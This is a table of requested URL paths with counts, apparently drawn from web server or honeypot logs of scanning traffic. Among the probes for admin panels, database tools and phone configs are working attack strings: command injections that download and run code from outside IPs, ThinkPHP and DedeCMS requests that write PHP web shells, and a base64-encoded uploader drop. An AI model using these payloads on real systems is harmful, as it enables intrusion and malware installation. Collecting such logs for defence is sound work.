uri	uri_count
/0094l-F-vWfM6kbCUIvzpHtAtHa5PKI753-FB8CSTxGmoaBRJmR5FmrS3oaniLi3lCRM-vptQ9G-vmYdxk1fOieLwdnrt2E3IIG-FwPCY5xm2D767LOh564v-vizkmg3bv5IiZJLFg9lXDiLHqTBXxQXUe5N9aVJnFTc4byf9kH89A8iPuKimJm3aVqqX16LDrI6TPfBXpGNs8ICi-v9nEc-d	1
/1/loading.php	1
/4/wp-login.php	1
/5ba7326b4e9c2da94b1ab40009a43b98.php	1
/6/wp-login.php	1
/7/wp-login.php	1
/8/wp-login.php	1
/8180/	1
/9/wp-login.php	1
/ACSServer/messagebroker/amf	1
/Aastra/	1
/Admin_Files/	1
/App	1
/App.php	1
/CACHE/sdesktop/install/start.htm	1
/CFIDE/Administrator/index.cfm	1
/CFIDE/administrator/login.cfm	1
/CFIDE/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfm	1
/CFIDE/probe.cfm	1
/CFIDE/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfm	1
/CFIDE/scripts/cfformhistory.cfm	1
/Cache/image.php	1
/Cache/images.php	1
/Consolidacion/ArchivosPorPublicacion	1
/Content/img/jj.png	1
/Dockerfile	1
/FCKeditor/editor/fckeditor.html	1
/FXIcIjNSAK.jsp/	1
/FormScripts/ajax/ckeditor/plugins/filemanager/filemanager.cfm	1
/FormScripts/cfformhistory.cfm	1
/FxCodeShell.jsp%2520	1
/FxCodeShell.jsp%3A%3A%24DATA	1
/FxCodeShell.jsp/	1
/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe	1
/Grandstream/	1
/Graphics/Tropical/styles.css	1
/Linksys/	1
/MSD/sql.php	1
/Message.action	1
/MicrosExecute/	1
/MikroTik/	1
/Msd/sql.php	1
/MyAdmin/setup.php	1
/MySQL/index.php	1
/MySQLDumper-1.24.4/index.php	1
/MySQLDumper/index.php	1
/MySQLDumper1.24.4	1
/MySQLDumper1.24.4/msd1.24.4/sql.php	1
/MySQLDumper1.24.4/sql.php	1
/MySQLDumper1.24.4stable	1
/MySQLDumper1.24.4stable/sql.php	1
/MySqlDumper/sql.php	1
/Mysqldumper/sql.php	1
/NQWpELlnID.jsp/	1
/Nmap/folder/check1502645791	1
/Nmap/folder/check1506846199	1
/Nmap/folder/check1526089399	1
/Nmap/folder/check1526665685	1
/Nmap/folder/check1529037290	1
/Nmap/folder/check1529474511	1
/Nmap/folder/check1531582878	1
/Nmap/folder/check1532035489	1
/Nmap/folder/check1534126511	1
/Nmap/folder/check1534566022	1
/Nmap/folder/check1539312054	1
/Nmap/folder/check1539773292	1
/Nmap/folder/check1541807842	1
/Nmap/folder/check1542301622	1
/Nmap/folder/check1544536069	1
/Nmap/folder/check1544993973	1
/Nmap/folder/check1547241710	1
/Nmap/folder/check1547717404	1
/Nmap/folder/check1550835110	1
/Nmap/folder/check1552384840	1
/Nmap/folder/check1552554640	1
/Nmap/folder/check1552575491	1
/Nmap/folder/check1552618700	1
/Nmap/folder/check1552982560	1
/Nmap/folder/check1553942726	1
/Nmap/folder/check1555268483	1
/Nmap/folder/check1555646532	1
/Nmap/folder/check1556437848	1
/Nmap/folder/check1556452707	1
/Nmap/folder/check1557574467	1
/Nmap/folder/check1560068197	1
/Nmap/folder/check1563308498	1
/Nmap/folder/check1563662191	1
/Nmap/folder/check1565425565	1
/Nmap/folder/check1568610593	1
/Nmap/folder/check1570779687	1
/Nmap/folder/check1573314131	1
/Nmap/folder/check1573703668	1
/Nmap/folder/check1574737764	1
/Nmap/folder/check1575014049	1
/Nmap/folder/check1576102905	1
/Nmap/folder/check1576547870	1
/Nmap/folder/check1576575668	1
/NmapUpperCheck1502645791	1
/NmapUpperCheck1506846199	1
/NmapUpperCheck1526089399	1
/NmapUpperCheck1526665685	1
/NmapUpperCheck1529037290	1
/NmapUpperCheck1529474511	1
/NmapUpperCheck1531582878	1
/NmapUpperCheck1532035489	1
/NmapUpperCheck1534126511	1
/NmapUpperCheck1534566022	1
/NmapUpperCheck1539312054	1
/NmapUpperCheck1539773292	1
/NmapUpperCheck1541807842	1
/NmapUpperCheck1542301622	1
/NmapUpperCheck1544536069	1
/NmapUpperCheck1544993973	1
/NmapUpperCheck1547241710	1
/NmapUpperCheck1547717404	1
/NmapUpperCheck1552384840	1
/NmapUpperCheck1552422041	1
/NmapUpperCheck1552554640	1
/NmapUpperCheck1552575491	1
/NmapUpperCheck1552618700	1
/NmapUpperCheck1552982560	1
/NmapUpperCheck1553942726	1
/NmapUpperCheck1553964567	1
/NmapUpperCheck1555268483	1
/NmapUpperCheck1555646532	1
/NmapUpperCheck1556437848	1
/NmapUpperCheck1556452707	1
/NmapUpperCheck1557574467	1
/NmapUpperCheck1560068197	1
/NmapUpperCheck1563308498	1
/NmapUpperCheck1563662191	1
/NmapUpperCheck1564643224	1
/NmapUpperCheck1565425565	1
/NmapUpperCheck1568610593	1
/NmapUpperCheck1570779687	1
/NmapUpperCheck1573314131	1
/NmapUpperCheck1573703668	1
/NmapUpperCheck1574737764	1
/NmapUpperCheck1575014049	1
/NmapUpperCheck1576059238	1
/NmapUpperCheck1576102905	1
/NmapUpperCheck1576547870	1
/NmapUpperCheck1576575668	1
/Omnia/	1
/P/M/A/index.php	1
/PLCM/000000000000.cfg	1
/PMA2011	1
/PMA2013	1
/PMA2015	1
/PMA2017	1
/PMA2018	1
/Panel/	1
/Panel/loading.php	1
/Panelll/loading.php	1
/Polycom/	1
/Polycom/000000000000.cfg	1
/Public/tb/login.png	1
/Public/ymx/main.png	1
/RELEASE-NOTES.txt	1
/RootDevice.xml	1
/SIPCfg	1
/SPA/	1
/SQL/setup.php	1
/SQLadmin/scripts/setup.php	1
/SSLMySQLAdmin/scripts/setup.php	1
/SSLMySQLAdmin/setup.php	1
/Security/users?auth=YWRtaW46MTEK	1
/Snom/	1
/T1RSbFltSTJNREF6TVdNMk4yVmlNR0kwTWpjM05HUmxNREEzWkdGa00yST0	1
/TEMPORARY_LISTEN_ADDRESSES/WSMAN	1
/Temporary_Listen_Addresses/WSMAN	1
/V2/Robot/Index	1
/VSR3/Forms/Login/Login.aspx	1
/WebItemLevel.cfg	1
/WebManagement/WebManagement.html	1
/WebMgmtEE/WebManagement.html	1
/Yealink/WebItemsLevel.cfg	1
/Yealink/y000000000000.cfg	1
/_MySQL/index.php	1
/_SQL/index.php	1
/_VTI_BIN/WSTS/	1
/_admin/scripts/setup.php	1
/_asterisk	1
/_asterisk/Ultimatex.php	1
/_async/AsyncResponseService	1
/_dumper/index.php	1
/_mysql/index.php	1
/_phpMyAdmin/index.php	1
/_phpmyadmin/index.php	1
/_sql/index.php	1
/a/loading.php	1
/a/wp-login.php	1
/a2billing/admin/	1
/a2billing/admin/config.php	1
/a2billing/agent/Public/templates/default/css/popup.css	1
/admin.cgi	1
/admin.login.jsp	1
/admin/agent/default.action	1
/admin/config.php?password%5B0%5D=ZIZO&username=admin	1
/admin/connection/	1
/admin/images/cal_date_over.gif	1
/admin/loading.php	1
/admin/login.php	1
/admin/pMA	1
/admin/phpMyAdmin	1
/admin/phpmyadmin	1
/admin/setup.php	1
/admin/sql.php	1
/admin/sql/scripts/setup.php	1
/admin/sql/setup.php	1
/admin/sql/sql.php	1
/admin/sqladmin	1
/admin/upload	1
/admin/upload.php	1
/administrator.cgi	1
/administrator/admin	1
/administrator/components/com_alberghi/upload.alberghi.php	1
/administrator/db	1
/administrator/manifests/files/joomla.xml	1
/administrator/phpmyadmin	1
/administrator/pma	1
/administrator/web	1
/ag198/	1
/algo/	1
/algom/	1
/alina/loading.php	1
/alinew/loading.php	1
/analyse.cgi	1
/api/backup/version.cgi	1
/api/v1/namespaces/default/pods	1
/api/v1/namespaces/kube-system/services/https%3Akubernetes-dashboard%3A/proxy/	1
/api/v1/status.json	1
/app/etc/local.xml	1
/app/provision/	1
/article/article.action	1
/aspnet_client/system_web/4_0_30319/update/DefaultForm.aspx?c91=b0ea051c89b7ed436f5f917ed69f8bbc&pfr=881456FCddd-410f3c42fc5f1a9d12ae96301a15358a&a8f=80371f4b8222b92fd59d85de868fcb59	1
/aspnet_client/system_web/4_0_30319/update/DefaultForm.txt?91e=6f2528a4759cd18fde2fce0dd27d70c8&pfr=881456FCddd-303993313b0cef81f0aaa3777a70fead&eb1=ebf3471f5a6935f371e5496e388e7fb1	1
/aspnet_client/system_web/4_0_30319/update/DefaultForm.txt?a2b=568c773e83256c2f9eeef8ae9d9c0258&pfr=881456FCddd-ebd651e535eaea7d965bec051ba5b542&88b=5c19520433432714f14528bec1ba1538	1
/aspq/aspx.gif	1
/assets/Ultimatex.php	1
/asterisk/	1
/asterisk/phoneprov/	1
/atacom/	1
/atcom/	1
/atcom/ag198/	1
/auth	1
/auth/login	1
/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|	1
/axis2-admin	1
/axis2/axis2-admin	1
/b/wp-login.php	1
/baFirmware/	1
/backup.zip	1
/backup/index.php	1
/backup/sql.php	1
/backups/sql.php	1
/bigconf.cgi	1
/bitrix/admin/	1
/bitrix/admin/index.php?lang=en	1
/blog/%23wp-config.php%23	1
/blog/.wp-config.php.swp	1
/blog/CHANGELOG.txt	1
/blog/wp-admin/install.php	1
/blog/wp-config.php.bak	1
/blog/wp-config.php~	1
/blog/xmlsrv/xmlrpc.php	1
/blogs/xmlsrv/xmlrpc.php	1
/browse/browse.action	1
/builder/	1
/bw/	1
/c/wp-login.php	1
/cacti/	1
/calendar/install/index.php	1
/cart.cgi	1
/ccmadmin/showHome.do	1
/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/filemanager.cfc?method=getfmfiles&returnformat=plain&path=.	1
/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/fm.png	1
/cfg/	1
/cfg/000000000000.cfg	1
/cfg/y000000000000.cfg	1
/cgi-bin/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|	1
/cgi-bin/awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%2024%2e224%2e174%2e18%2flisten%3bchmod%20%2bx%20listen%3b%2e%2flisten%20216%2e102%2e212%2e115;echo%20YYY;echo|	1
/cgi-bin/hello	1
/cgi-bin/hi3510/getidentify.cgi	1
/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=%22%26id%26%22	1
/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=%22%26uname%20-a%26%22	1
/cgi-bin/login.cgi	1
/cgi-bin/luci	1
/cgi-mod/index.cgi	1
/cgi/online.asp?hostname=[WIN-X6HF63]&httptype=[1][not%20httptunnel]	1
/cisco	1
/cisco-spa-112/112.xml	1
/cisco/	1
/cisco/112.xml	1
/client/en/community/supportcli.php	1
/cmd.exe	1
/cms1/wp-login.php	1
/common.js	1
/components/com_facileforms/libraries/jquery/def.gif	1
/components/com_facileforms/libraries/jquery/up.php	1
/components/com_jbcatalog/libraries/jsupload/server/php/files/def.gif	1
/components/com_jbcatalog/libraries/jsupload/server/php/files/up.php	1
/components/com_sexycontactform/fileupload/files/def.gif	1
/components/com_sexycontactform/fileupload/files/up.php	1
/computer/%28master%29/script	1
/conf/	1
/config	1
/config/	1
/config/000000000000.cfg	1
/config/config.inc.php	1
/config_server/	1
/configuration/	1
/cools.php?id=wget%20-O%20apche2017.sh%20http://222.184.79.11:5317/apche2017.sh;chmod%20775%20apche2017.sh;./apche2017.sh	1
/core/modules/language/language.info.yml	1
/cp860/	1
/cp_errordocument.shtml	1
/cpanelsql/scripts/setup.php	1
/crm/index.php	1
/crm/index.php?action=Login&module=Users	1
/css/main_page.css	1
/ctc/servlet/ConfigServlet	1
/ctcrvlet/ConfigServlet	1
/current_config/Account1	1
/d/wp-login.php	1
/d50/	1
/dana-na/nc/nc_gina_ver.txt	1
/data2.php	1
/database/index.php	1
/database/print.css	1
/database/sql.php	1
/datenbank/index.php	1
/datenbank/sql.php	1
/db/db-admin	1
/db/dbweb	1
/db/phpMyAdmin3	1
/db/phpmyadmin	1
/db/phpmyadmin/scripts/setup.php	1
/db/phpmyadmin3	1
/db/webadmin	1
/db/websql	1
/dba/index.php	1
/dbs/index.php	1
/debug.cgi	1
/dede/tpl.php	1
/dede/tpl.php?action=savetagfile&actiondo=addnewtag&content=%3C?php%20$s=create_function(%27%27,$_REQUEST%5Bshell%5D);$s();?%3E&filename=shell.lib.php	1
/default	1
/default_wallet	1
/demo/wp-login.php	1
/desc.xml	1
/dev	1
/dev.cgi?c=ls%20-al	1
/devinfo.html?abc=images/	1
/dh/count.asp	1
/digium/	1
/digium/d50/	1
/dir/wp-login.php	1
/directory/	1
/dms/	1
/dms/Cisco112/112.xml	1
/dms/Cisco122/122.xml	1
/dms/Cisco2102/2102.xml	1
/dms/Cisco303/303.xml	1
/dms/Cisco504/504.xml	1
/dms/Cisco508/508.xml	1
/dms/Cisco509/509.xml	1
/dms/Cisco525/525.xml	1
/dms/T41P/y000000000036.cfg	1
/dms/T42G/y000000000029.cfg	1
/dms/T58A/y000000000058.cfg	1
/dms/Yealink-CP860/y000000000037.cfg	1
/dms/Yealink-T27P/y000000000045.cfg	1
/dms/Yealink-T41S/y000000000068.cfg	1
/dms/Yealink-T42S/y000000000067.cfg	1
/dms/Yealink-T46G/y000000000028.cfg	1
/dms/Yealink-T46S/y000000000066.cfg	1
/dms/Yealink-T48G/y000000000035.cfg	1
/dms/Yealink-T48S/y000000000065.cfg	1
/dms/Yealink-T58/y000000000058.cfg	1
/dms/Yealink-VP530/y000000000023.cfg	1
/dms/Yealink/T41P/y000000000036.cfg	1
/dms/Yealink/T46G/y000000000028.cfg	1
/dms/Yealink/W52/y000000000025.cfg	1
/dms/Yealink/y000000000036.cfg	1
/dms/YealinkCP960/y000000000073.cfg	1
/dms/YealinkT19P/y000000000031.cfg	1
/dms/YealinkT19PDMS/y000000000031.cfg	1
/dms/YealinkT20P/y000000000007.cfg	1
/dms/YealinkT21P/y000000000034.cfg	1
/dms/YealinkT21PDMS/y000000000034.cfg	1
/dms/YealinkT21PE2DMS/y000000000052.cfg	1
/dms/YealinkT22P/y000000000005.cfg	1
/dms/YealinkT26P/y000000000004.cfg	1
/dms/YealinkT28P/y000000000000.cfg	1
/dms/YealinkT32G/y000000000032.cfg	1
/dms/YealinkT38G/y000000000038.cfg	1
/dms/YealinkT41P/y000000000036.cfg	1
/dms/YealinkT42G/y000000000029.cfg	1
/dms/YealinkT46G/y000000000028.cfg	1
/dms/YealinkT46S/y000000000066.cfg	1
/dms/YealinkT48DMS/y000000000035.cfg	1
/dms/YealinkT48G/y000000000035.cfg	1
/dms/YealinkT4xTemplate/y000000000028.cfg	1
/dms/YealinkT4xTemplate/y000000000029.cfg	1
/dms/YealinkT4xTemplate/y000000000036.cfg	1
/dms/YealinkTemplate/y000000000023.cfg	1
/dms/YealinkW52P/y000000000025.cfg	1
/dms/Yealink_TxP/y000000000031.cfg	1
/dms/Yealink_W52P/y000000000025.cfg	1
/dms/cisco-spa-112/112.xml	1
/dms/cisco-spa-122/122.xml	1
/dms/cisco-spa-2102/2102.xml	1
/dms/cisco-spa-303/303.xml	1
/dms/cisco-spa-504/504.xml	1
/dms/cisco-spa-508/508.xml	1
/dms/cisco-spa-509/509.xml	1
/dms/cisco-spa-525/525.xml	1
/dms/cisco/spa112/112.xml	1
/dms/cisco/spa122/122.xml	1
/dms/cisco/spa2102/2102.xml	1
/dms/cisco/spa303/303.xml	1
/dms/cisco/spa504/504.xml	1
/dms/cisco/spa508/508.xml	1
/dms/cisco/spa509/509.xml	1
/dms/cisco/spa525/525.xml	1
/dms/polycom/000000000000.cfg	1
/dms/t41p/y000000000000.cfg	1
/dms/t41p/y000000000036.cfg	1
/dms/t42g/y000000000000.cfg	1
/dms/t42g/y000000000029.cfg	1
/dms/yealink-cp860/favorite_setting.xml	1
/dms/yealink-cp920/favorite_setting.xml	1
/dms/yealink-t23g/favorite_setting.xml	1
/dms/yealink-t23g/y000000000044.cfg	1
/dms/yealink-t27g/favorite_setting.xml	1
/dms/yealink-t27g/y000000000069.cfg	1
/dms/yealink-t27p/favorite_setting.xml	1
/dms/yealink-t27p/y000000000045.cfg	1
/dms/yealink-t28p/favorite_setting.xml	1
/dms/yealink-t29g/favorite_setting.xml	1
/dms/yealink-t40g/favorite_setting.xml	1
/dms/yealink-t40g/y000000000076.cfg	1
/dms/yealink-t40p/favorite_setting.xml	1
/dms/yealink-t41p/favorite_setting.xml	1
/dms/yealink-t41p/y000000000036.cfg	1
/dms/yealink-t41s/favorite_setting.xml	1
/dms/yealink-t42g/favorite_setting.xml	1
/dms/yealink-t42s/favorite_setting.xml	1
/dms/yealink-t42s/y000000000067.cfg	1
/dms/yealink-t46g/favorite_setting.xml	1
/dms/yealink-t46g/y000000000028.cfg	1
/dms/yealink-t46s/favorite_setting.xml	1
/dms/yealink-t48g/favorite_setting.xml	1
/dms/yealink-t48g/y000000000035.cfg	1
/dms/yealink-t48s/favorite_setting.xml	1
/dms/yealink-t48s/y000000000065.cfg	1
/dms/yealink-t49g/favorite_setting.xml	1
/dms/yealink-t49g/y000000000051.cfg	1
/dms/yealink-t54w/favorite_setting.xml	1
/dms/yealink-t57w/favorite_setting.xml	1
/dms/yealink-vp530/y000000000023.cfg	1
/dms/yealink/t41p/y000000000036.cfg	1
/dms/yealink/t49g/favorite_setting.xml	1
/dms/yealink/y000000000036.cfg	1
/dms/yealink_t22p/y000000000005.cfg	1
/dms/yealink_t42g/favorite_setting.xml	1
/dms/yealink_t42s/favorite_setting.xml	1
/dms/yealink_t46g/favorite_setting.xml	1
/dms/yealink_t48g/favorite_setting.xml	1
/dms/yealink_t48g/y000000000035.cfg	1
/dms/yealink_w52p/favorite_setting.xml	1
/dms/yealink_w52p/y000000000025.cfg	1
/dms/yealink_w60b/y000000000077.cfg	1
/dms/yealinkcp860/favorite_setting.xml	1
/dms/yealinkt20p/favorite_setting.xml	1
/dms/yealinkt20p/y000000000007.cfg	1
/dms/yealinkt22p/favorite_setting.xml	1
/dms/yealinkt22p/y000000000005.cfg	1
/dms/yealinkt26p/favorite_setting.xml	1
/dms/yealinkt26p/y000000000004.cfg	1
/dms/yealinkt27p/favorite_setting.xml	1
/dms/yealinkt28p/y000000000000.cfg	1
/dms/yealinkt32g/y000000000032.cfg	1
/dms/yealinkt38g/y000000000038.cfg	1
/dms/yealinkt41p/favorite_setting.xml	1
/dms/yealinkt41p/y000000000036.cfg	1
/dms/yealinkt42g/favorite_setting.xml	1
/dms/yealinkt42g/y000000000029.cfg	1
/dms/yealinkt42s/favorite_setting.xml	1
/dms/yealinkt46g/favorite_setting.xml	1
/dms/yealinkt46g/y000000000028.cfg	1
/dms/yealinkt46s/favorite_setting.xml	1
/dms/yealinkt46s/y000000000066.cfg	1
/dms/yealinkt48g/favorite_setting.xml	1
/dms/yealinkt48g/y000000000035.cfg	1
/dms/yealinkt49g/favorite_setting.xml	1
/dms/yealinkt49g/y000000000051.cfg	1
/dms/yealinkw52p/y000000000025.cfg	1
/dns/style.css	1
/do.php	1
/downloader/index.php	1
/downloads.log	1
/drop_ip.html	1
/drupal/CHANGELOG.txt	1
/drupal/user/register	1
/drupal/xmlrpc.php	1
/drupal7/user/register	1
/drupal8/user/register	1
/dump/sql.php	1
/dumper/sql.php	1
/e3xx/	1
/elrekt.php	1
/emailmarketer/admin/index.php	1
/engine/smarty/	1
/errors/503.php	1
/escene/	1
/escene/e3xx/	1
/etc/apps/phpsysinfo/xml.php?plugin=complete	1
/etc/linuxigd/gatedesc.xml	1
/external/ups-php/upsShip.php?task=a	1
/extralog/loading.php	1
/ezon/login.do	1
/fanvil/	1
/fax/	1
/fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media	1
/fifo/	1
/fileserver/index.html	1
/firmware	1
/flex2gateway/amf	1
/folder/	1
/folder/gate.php	1
/fonts/ftnt-icons.woff	1
/forum/CHANGELOG.txt	1
/forum/login.php	1
/fpbx/	1
/frame/first.action	1
/fw/	1
/gate	1
/gateway	1
/gateways/	1
/getimage/273867.gif	1
/getimage/295135.png	1
/gif/style.css	1
/gitweb.cgi	1
/gitweb/gitweb.cgi	1
/global-protect/login.esp	1
/goip/	1
/gswave/	1
/handle_load_config.php	1
/header.php	1
/hokaCRmHOq.jsp/	1
/home.jsp	1
/home/login.action	1
/hostinventoriesoverview.php	1
/htek/	1
/iVhVYjzVau.jsp/	1
/idman630build10.exe	1
/images/client_download.png	1
/images/def.gif	1
/images/ers.JPG	1
/images/logon.gif	1
/images/stories/filemga.php	1
/images/vuln2.php	1
/indec.html	1
/index%21login.do	1
/index.cfm	1
/index.cgi	1
/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D	1
/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E')	1
/index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))	1
/index.php/?s=index/%5Cthink%5CRequest/input&filter=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D&data=1	1
/index.php/?s=index/%5Cthink%5CRequest/input&filter=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))&data=1	1
/index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),'CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E');	1
/index.php/?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))	1
/index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=lx.php&content=CnLuXun%3C?php%20@eval($_POST%5B'lx'%5D);?%3E	1
/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=$%7B@print(eval(phpinfo().fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='))))%7D	1
/index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=%3C?php%20fputs(fopen('lx.php','w'),base64_decode('Q25sdVh1bjw/cGhwIEBldmFsKCRfUE9TVFsnbHgnXSk7Pz4='));?%3E	1
/index.php/admin/	1
/index.php/component/users/?view=login	1
/index.php?,%27=file_put_contents%28%22external%2Fups-php%2FupsShip.php%22%2Cbase64_decode%28%22PD9waHAgY2xhc3MgYXtjb25zdCBiPScxJztjb25zdCBjPScwJztwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIGQoJGUpIHskZj0kX0ZJTEVTWydfJ11bJ3RtcF9uYW1lJ107aWYobW92ZV91cGxvYWRlZF9maWxlKCRmLF9fRklMRV9fKSkge2RpZShzZWxmOjpiKTt9ZWxzZXtkaWUoc2VsZjo6Yyk7fX19YTo6ZCgkX1BPU1QpOw%3D%3D%22%29%29%3B	1
/index.php?action=Login&module=Users/index.php?action=Login&module=Users	1
/index.php?l=page_view&p=advanced_search	1
/index.php?option=com_cckjseblod&task=download&file=configuration.php	1
/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=	1
/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php	1
/index.php?option=com_macgallery&view=download&albumid=../../configuration.php	1
/index.php?option=com_myblog&task=ajaxupload	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%¯/	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50E?	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50J?	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50R£'	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50dzÚ	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50Ê	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50Z1	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50É2	1
/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50æ¥#	1
